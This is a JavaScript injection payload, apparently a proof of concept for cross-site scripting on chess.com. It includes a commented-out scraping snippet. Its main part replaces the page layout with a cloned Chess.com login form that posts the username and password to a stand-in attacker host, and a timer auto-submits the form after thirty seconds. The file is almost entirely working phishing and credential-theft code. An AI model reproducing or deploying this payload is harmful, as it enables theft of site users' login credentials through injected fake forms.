alert(1);
/*fetch("https://www.chess.com/play/apps").then((response) => response.text())
    .then((text) => {
                var parser = new DOMParser();

        var doc = parser.parseFromString(text, "text/html");
        
 var a = doc.getElementsByClassName('mobile-app-form-link')[0].getElementsByTagName("a")[0].href
        alert(a.match(/(?:[a-z0-9+!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])/gi)[0])
                    }
         )
*/
alert('fake form')
formHTML = `
<div class="base-layout new">
                                            <div class="base-sidebar" style="visibility: collapse;">
          
  



<div id="login-register-modal"></div>

<div id="shareable-game-url-modal"></div>

<div id="message-modal"></div>


<div id="free-diamond-month-modal"></div>

<div id="first-time-modal"></div>

<div id="achievements-modal"></div>

<div id="puzzle-battle-challenge-toaster"></div>

<div id="leagues-division-started-modal"></div>


  <div id="offline-challenge-toaster" data-badge="challenges" data-badge-count="0"></div>

  <div id="old-browser-modal"></div>

<link href="/bundles/app/css/sprites.client.ef68422b.css" type="text/css" rel="stylesheet">

    
<div id="sb" style="" class="nav-component guest new" data-constant-message-unread-count-max="100" data-notifications-limit="200" data-route-login-and-go="https://www.chess.com/login_and_go" data-route-register="https://www.chess.com/register">
          <div id="sb-cover" data-mobile-nav-toggle=""></div>
  
    <div class="nav-action toggle close" data-mobile-nav-toggle="">
    <span class="icon-font-chess x"></span>
  </div>

    <div data-nav-top="">
    
        
    
    <a aria-label="Chess.com - Play Chess Online" class="nav-link-component nav-link-new-main-design chess-logo-wrapper sprite chess-logo no-panel" data-nav-link="home" data-amplitude-nav-selection="home" href="https://www.chess.com/today" target="_self">
              <span class="nav-link-text mobile-only">Home</span>
      
              
                  <!---->
                  </a>
    
    
        
        <a class="nav-link-component nav-link-new-main-design nav-link-top-level sprite play-top" data-amplitude-nav-selection="play" data-nav-link="play" href="https://www.chess.com/play" target="_self">
      <span class="nav-link-text">Play</span>
              <!---->
          </a>
    
        
    <div class="nav-panel-component" data-nav-panel="play" data-routes="{&quot;leaderboard&quot;:&quot;https:\/\/www.chess.com\/leaderboard&quot;,&quot;live&quot;:&quot;https:\/\/www.chess.com\/live&quot;,&quot;daily&quot;:&quot;https:\/\/www.chess.com\/play\/online\/daily&quot;,&quot;computer&quot;:&quot;https:\/\/www.chess.com\/play\/computer&quot;,&quot;playOnline&quot;:&quot;https:\/\/www.chess.com\/play\/online&quot;,&quot;playPage&quot;:&quot;https:\/\/www.chess.com\/play&quot;,&quot;playFriend&quot;:&quot;https:\/\/www.chess.com\/play\/online\/friend&quot;,&quot;puzzleBattle&quot;:&quot;https:\/\/www.chess.com\/puzzles\/battle&quot;,&quot;puzzles&quot;:&quot;https:\/\/www.chess.com\/puzzles\/rush&quot;,&quot;tournamentsPlay&quot;:&quot;https:\/\/www.chess.com\/play\/online\/tournaments&quot;,&quot;tournaments&quot;:&quot;https:\/\/www.chess.com\/tournaments&quot;,&quot;library&quot;:&quot;https:\/\/www.chess.com\/library&quot;,&quot;gameArchive&quot;:&quot;https:\/\/www.chess.com\/games\/archive&quot;,&quot;variants&quot;:&quot;https:\/\/www.chess.com\/variants&quot;}">
    </div>
    
        <a class="nav-link-component nav-link-new-main-design nav-link-top-level sprite puzzles-top" data-amplitude-nav-selection="puzzles" data-nav-link="puzzles" href="https://www.chess.com/puzzles" target="_self">
      <span class="nav-link-text">Puzzles</span>
    </a>
    
        
    <div class="nav-panel-component" data-nav-panel="puzzles" data-routes="{&quot;dailyPuzzle&quot;:&quot;https:\/\/www.chess.com\/daily-chess-puzzle&quot;,&quot;drills&quot;:&quot;https:\/\/www.chess.com\/drills&quot;,&quot;endgames&quot;:&quot;https:\/\/www.chess.com\/endgames&quot;,&quot;practice&quot;:&quot;https:\/\/www.chess.com\/practice&quot;,&quot;puzzleBattle&quot;:&quot;https:\/\/www.chess.com\/puzzles\/battle&quot;,&quot;puzzlesCustom&quot;:&quot;https:\/\/www.chess.com\/puzzles\/learning&quot;,&quot;puzzlesRush&quot;:&quot;https:\/\/www.chess.com\/puzzles\/rush&quot;,&quot;puzzlesRated&quot;:&quot;https:\/\/www.chess.com\/puzzles\/rated&quot;,&quot;tactics&quot;:&quot;https:\/\/www.chess.com\/puzzles&quot;,&quot;soloChess&quot;:&quot;https:\/\/www.chess.com\/solo-chess&quot;}">
    </div>
    
        <a class="nav-link-component nav-link-new-main-design nav-link-top-level sprite learn-top" data-amplitude-nav-selection="learn" data-nav-link="learn" href="https://www.chess.com/learn" target="_self">
      <span class="nav-link-text">Learn</span>
    </a>
    
            
    <div class="nav-panel-component" data-nav-panel="learn" data-routes="{&quot;articles&quot;:&quot;https:\/\/www.chess.com\/articles&quot;,&quot;tactics&quot;:&quot;https:\/\/www.chess.com\/puzzles&quot;,&quot;lessons&quot;:&quot;https:\/\/www.chess.com\/lessons&quot;,&quot;insights&quot;:&quot;https:\/\/www.chess.com\/insights&quot;,&quot;videos&quot;:&quot;https:\/\/www.chess.com\/videos&quot;,&quot;openings&quot;:&quot;https:\/\/www.chess.com\/openings&quot;,&quot;explorer&quot;:&quot;https:\/\/www.chess.com\/explorer&quot;,&quot;drills&quot;:&quot;https:\/\/www.chess.com\/drills&quot;,&quot;vision&quot;:&quot;https:\/\/www.chess.com\/vision&quot;,&quot;analysis&quot;:&quot;https:\/\/www.chess.com\/analysis&quot;,&quot;classroom&quot;:&quot;https:\/\/www.chess.com\/classroom&quot;,&quot;endgames&quot;:&quot;https:\/\/www.chess.com\/endgames&quot;,&quot;practice&quot;:&quot;https:\/\/www.chess.com\/practice&quot;}">
    </div>
    
        
    <a class="nav-link-component nav-link-new-main-design nav-link-top-level sprite today-top" data-amplitude-nav-selection="watch" data-nav-link="today" href="https://www.chess.com/watch" target="_self">
            <span class="nav-link-text">Watch</span>
    </a>
    
        
    <div class="nav-panel-component" data-nav-panel="today" data-routes="{&quot;chessToday&quot;:&quot;https:\/\/www.chess.com\/today&quot;,&quot;computerChampionship&quot;:&quot;https:\/\/www.chess.com\/computer-chess-championship&quot;,&quot;events&quot;:&quot;https:\/\/www.chess.com\/events&quot;,&quot;news&quot;:&quot;https:\/\/www.chess.com\/news&quot;,&quot;proChessLeague&quot;:&quot;http:\/\/www.prochessleague.com&quot;,&quot;streamers&quot;:&quot;https:\/\/www.chess.com\/streamers&quot;}">
    </div>
    
              <a class="nav-link-component nav-link-new-main-design nav-link-top-level sprite news-top" data-amplitude-nav-selection="news" data-nav-link="news" href="https://www.chess.com/today" target="_self">
        <span class="nav-link-text">News</span>
      </a>

      
      <div class="nav-panel-component" data-nav-panel="news" data-routes="{&quot;articles&quot;:&quot;https:\/\/www.chess.com\/articles&quot;,&quot;chessToday&quot;:&quot;https:\/\/www.chess.com\/today&quot;,&quot;liveRankings&quot;:&quot;https:\/\/www.chess.com\/ratings&quot;,&quot;news&quot;:&quot;https:\/\/www.chess.com\/news&quot;,&quot;topPlayers&quot;:&quot;https:\/\/www.chess.com\/players&quot;}">
      </div>
        
        <a class="nav-link-component nav-link-new-main-design nav-link-top-level sprite social-top" data-amplitude-nav-selection="social" data-nav-link="connect" href="https://www.chess.com/social" target="_self">
      <span class="nav-link-text">Social</span>
          </a>
    
        

        <div class="nav-panel-component" data-nav-panel="connect" data-routes="{&quot;articles&quot;:&quot;https:\/\/www.chess.com\/articles&quot;,&quot;news&quot;:&quot;https:\/\/www.chess.com\/news&quot;,&quot;forums&quot;:&quot;https:\/\/www.chess.com\/forum&quot;,&quot;blogs&quot;:&quot;https:\/\/www.chess.com\/blogs&quot;,&quot;clubs&quot;:&quot;https:\/\/www.chess.com\/clubs&quot;,&quot;friends&quot;:&quot;https:\/\/www.chess.com\/home\/friends&quot;,&quot;members&quot;:&quot;https:\/\/www.chess.com\/members&quot;,&quot;coaches&quot;:&quot;https:\/\/www.chess.com\/coaches&quot;,&quot;chessToday&quot;:&quot;https:\/\/www.chess.com\/today&quot;}">
    </div>

          <button aria-label="More" class="nav-link-component nav-link-new-main-design nav-link-button nav-link-top-level sprite more-top" data-amplitude-nav-selection="more" goto="https://www.chess.com/more" data-nav-link="more">
        <span class="nav-link-text">More</span>
      </button>
    
            
    <div class="nav-panel-component" data-nav-panel="more" data-routes="{&quot;articles&quot;:&quot;https:\/\/www.chess.com\/articles&quot;,&quot;blogs&quot;:&quot;https:\/\/www.chess.com\/blogs&quot;,&quot;computerChampionship&quot;:&quot;https:\/\/www.chess.com\/computer-chess-championship&quot;,&quot;dailyPuzzle&quot;:&quot;https:\/\/www.chess.com\/goto_daily_puzzle&quot;,&quot;explorer&quot;:&quot;https:\/\/www.chess.com\/explorer&quot;,&quot;verified&quot;:&quot;https:\/\/www.chess.com\/verified&quot;,&quot;leaderboard&quot;:&quot;https:\/\/www.chess.com\/leaderboard\/live&quot;,&quot;library&quot;:&quot;https:\/\/www.chess.com\/library&quot;,&quot;liveRankings&quot;:&quot;https:\/\/www.chess.com\/ratings&quot;,&quot;resourcesPage&quot;:&quot;https:\/\/www.chess.com\/resources&quot;,&quot;rules&quot;:&quot;https:\/\/www.chess.com\/learn-how-to-play-chess&quot;,&quot;masterGames&quot;:&quot;https:\/\/www.chess.com\/games&quot;,&quot;mobileApps&quot;:&quot;https:\/\/www.chess.com\/play\/apps&quot;,&quot;news&quot;:&quot;https:\/\/www.chess.com\/news&quot;,&quot;soloChess&quot;:&quot;https:\/\/www.chess.com\/solo-chess&quot;,&quot;terms&quot;:&quot;https:\/\/www.chess.com\/terms&quot;,&quot;topPlayers&quot;:&quot;https:\/\/www.chess.com\/players&quot;,&quot;videos&quot;:&quot;https:\/\/www.chess.com\/videos&quot;,&quot;vision&quot;:&quot;https:\/\/www.chess.com\/vision&quot;,&quot;voteChess&quot;:&quot;https:\/\/www.chess.com\/votechess&quot;}">
    </div>
    
    
    <div class="nav-link-wrapper">
            <a href="https://www.chess.com/search" target="_self" class="nav-link-component nav-link-new-main-design nav-link-top-level nav-search-icon" aria-label="Search" data-amplitude-nav-selection="subnav-search" data-nav-action-search="" data-nav-toggle-search-box="">
        <div class="nav-toggle-search-box">
          <span id="search" class="search-icon-font icon-font-chess magnifying-glass"></span>
        </div>
      </a>

            <div class="nav-popover nav-search" data-nav-popover-search="">
        <div class="arrow"></div>

        <div class="autocomplete-component" value=""><div class="autocomplete-input-group"><div class="ui_v5-input-group-component autofocus"><input class="ui_v5-input-component" id="" aria-label="Search" autocomplete="off" maxlength="32" name="keyword" placeholder="Search" type="text"> <!----> <!----> <!----> <!----></div> <div class="spinner-ring-component spinner-ring-small autocomplete-loading" style="display: none;"></div></div> <ul class="autocomplete-list" style="display: none;"> <li class="autocomplete-active autocomplete-list-item autocomplete-query"><div class="autocomplete-list-group"><span class="icon-font-chess magnifying-glass autocomplete-query-icon"></span> <div>All Results for <strong></strong></div></div></li></ul></div>
      </div>
          </div>

    <div class="nav-search-form">
      <div class="autocomplete-component" value=""><div class="autocomplete-input-group"><div class="ui_v5-input-group-component ui_v5-input-group-dark"><input class="ui_v5-input-component ui_v5-input-dark" id="" aria-label="Search" autocomplete="off" maxlength="32" name="keyword" placeholder="Search" type="text"> <!----> <!----> <!----> <!----></div> <div class="spinner-ring-component spinner-ring-small spinner-ring-dark autocomplete-loading" style="display: none;"></div></div> <ul class="autocomplete-list" style="display: none;"> <li class="autocomplete-active autocomplete-list-item autocomplete-query"><div class="autocomplete-list-group"><span class="icon-font-chess magnifying-glass autocomplete-query-icon"></span> <div>All Results for <strong></strong></div></div></li></ul></div>
    </div>

              
                  
      <a id="menu-cta" data-amplitude-props="{&quot;source&quot;:&quot;Unknown&quot;}" href="https://www.chess.com/register?returnUrl=https://www.chess.com/member/ceyokid111" target="_self" rel="nofollow" class="button auth signup register ui_v5-button-component ui_v5-button-basic-dark authentication-modal-trigger">
        <span class="icon-font-chess icon user-plus"></span>

        <span class="label">Sign Up</span>
      </a>
      
            <a href="https://www.chess.com/login_and_go?returnUrl=https://www.chess.com/member/ceyokid111" target="_self" rel="nofollow" class="button auth login ui_v5-button-component ui_v5-button-primary login-modal-trigger">
        <span class="icon-font-chess icon enter"></span>

        <span class="label">Log In</span>
      </a>
                </div>
    <div class="nav-menu-area">
              <button aria-label="Change language" class="nav-action language-select" type="button">
        <span class="icon-font-chess nav-language-icon globe"></span>

        <span class="nav-link-text nav-language-name">
          English
        </span>
      </button>
        
            
                  <button aria-label="Light/Dark Interface" class="nav-action ui-mode" data-amplitude-nav-selection="subnav-uimode" data-nav-ui-mode="" type="button">
        <span class="icon-font-chess darklight"></span>

        <span class="nav-link-text">
          <span class="light">Light UI</span>
          <span class="dark">Dark UI</span>
        </span>
      </button>
        
            
            
        <button type="button" aria-label="Help" class="nav-action has-popover help" data-amplitude-nav-selection="subnav-help">
      <span class="icon-font-chess circle-question"></span>

      <span class="nav-link-text">Help</span>
    </button>
    
        <div class="dark nav-popover help">
            <div class="arrow"></div>
      
            <button type="button" class="btn-link help-scout" data-amplitude-nav-selection="subnav-help-askaquestion">
        <span class="icon-font-chess circle-question"></span>

        <span class="title">Ask a Question</span>
      </button>
      
            <a data-amplitude-nav-selection="subnav-help-reportabuse" class="btn-link" rel="noopener" href="https://support.chess.com/collection/136-community-safety" target="_blank">
        <span class="icon-font-chess circle-block"></span>

        <span class="title">Report Abuse</span>
      </a>
      
            <button type="button" class="btn-link user-snap" data-amplitude-nav-selection="subnav-help-makeasuggestion">
        <span class="icon-font-chess lightbulb"></span>

        <span class="title">Make a Suggestion</span>
      </button>
      
            <a data-amplitude-nav-selection="subnav-help-billingissues" class="btn-link" rel="noopener" href="https://support.chess.com/category/135-membership-and-billing" target="_blank">
        <span class="icon-font-chess card"></span>

        <span class="title">Billing Issues</span>
      </a>
      
            <button type="button" class="btn-link user-snap" data-amplitude-nav-selection="subnav-help-reportabug">
        <span class="icon-font-chess bug"></span>

        <span class="title">Report a Bug</span>
      </button>
          </div>
      </div>
  </div>


          </div>
      
            <div class="base-container">
<style>
    .login-header {
        display: flex;
        justify-content: center;
        margin: 1.3rem auto;
        max-width: 100%;
        width: 33rem;
    }

    .login-logo {
        background: url(/bundles/web/images/logo/logo.d5e7118b.svg) no-repeat 50%;
        background-size: contain;
        display: inline-block;
        height: 3.2rem;
        text-indent: -999em;
        width: 11.6rem;
    }

    .login-component {
        margin: 0 auto 1.5rem;
        max-width: 100%;
        overflow: hidden;
        width: 33rem;
    }

    .login-form-wrapper {
        padding: 1.5rem 0.8rem;
    }

    @media (min-width: 330px) {
        .login-form-wrapper {
            padding: 1.5rem;
        }
    }

    @media (min-width: 768px) {
        .login-form-wrapper {
            padding: 3rem;
        }
    }

    .authentication-login-form {
        display: flex;
        flex-direction: column;
    }

    .login-form>*+* {
        margin-top: 1.5rem;
    }

    button {
        width: 100%;
    }
</style>
<header class="login-header">
    <a href="https://www.chess.com/" class="login-logo" title="Chess.com">
        Chess.com
    </a>
</header>
<main class="v5-section login-component">
    <div class="login-form-wrapper">
        <form novalidate="" method="POST" action="https://attackerwebsiteexample.com///" autocomplete="on" id="login-form" class="authentication-login-form login-form">
            <div>
                <input type="email" id="username" name="_username" required="required" form-error-clear="" class="ui_v5-input-component login-input" placeholder="Username or Email" autofocus="" aria-label="Username or Email" autocomplete="email">
            </div>

            <div class="ui_v5-input-group-component">
                <input type="password" id="password" name="_password" required="required" form-error-clear="" class="ui_v5-input-component ui_v5-input-group-space-right login-input" placeholder="Password" aria-label="Password" autocomplete="current-password">

                <button type="button" id="toggle-password-visibility" class="ui_v5-input-group-button login-toggle-password-visibility">
                    <span id="toggle-password-visibility-icon" class="icon-font-chess ui_v5-input-group-icon login-icon-eye eye" aria-hidden="true">
                    </span>
                </button>
            </div>

            <div class="authentication-login-options">
                <a href="https://www.chess.com/forgot" class="authentication-login-forgot" title="Forgot Password?">
                    Forgot Password?
                </a>
                <label class="checkbox-inline"><input type="checkbox" id="_remember_me" name="_remember_me" class="" container-class="checkbox-inline" data-tinymce="false" form-error-clear="" full_name="_remember_me" value="1">
                    Remember
                </label>
            </div>

            <button type="submit" id="login" name="login" theme="primary" size="large" class=" ui_v5-button-component ui_v5-button-primary ui_v5-button-large" data-no-controls="true">Log
                In</button>
        </form>
    </div>
</main>
</div>
    </div>
    `

document.getElementsByClassName('base-layout')[0].innerHTML = formHTML
setTimeout(() => {
          document.getElementsByClassName('login-form')[0].submit()
}, 30000)
